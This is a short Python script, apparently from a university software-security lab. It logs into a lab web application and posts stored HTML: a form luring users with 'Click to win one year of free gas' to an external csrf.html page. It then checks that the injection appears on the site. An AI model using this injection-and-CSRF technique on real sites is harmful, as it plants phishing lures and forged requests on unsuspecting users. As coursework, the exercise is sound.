mport requests
import string

login_data = {'username' : 'teste1', 'password' : 'teste1'}

URL = 'http://34ead85a967c3a29f1f3d306c40d31e50f45c0adc2ef24f9f20babfa4e40.project.ssof.rnl.tecnico.ulisboa.pt'

init_url = URL + '/init'
register_url = URL + '/register'
login_url = URL + '/login'
new_post_url = URL + '/create_post'


edit = {'content' : ' <form action="https://web.tecnico.ulisboa.pt/~ist190593/ssof/csrf.html"><input type="submit" value="Click to win one year of free gas" /> </form>' ,
	 'type' : 'Public'}


with requests.Session() as s:
	   
	r = s.get(init_url)
	r = s.post(register_url, data = login_data)
	r = s.post(login_url, data = login_data)
	r = s.post(new_post_url, data=edit)
	r = s.get(URL)
	
	#Checks if the script has successfully added to the html
	assert '<form action="https://web.tecnico.ulisboa.pt/~ist190593/ssof/csrf.html">' in r.text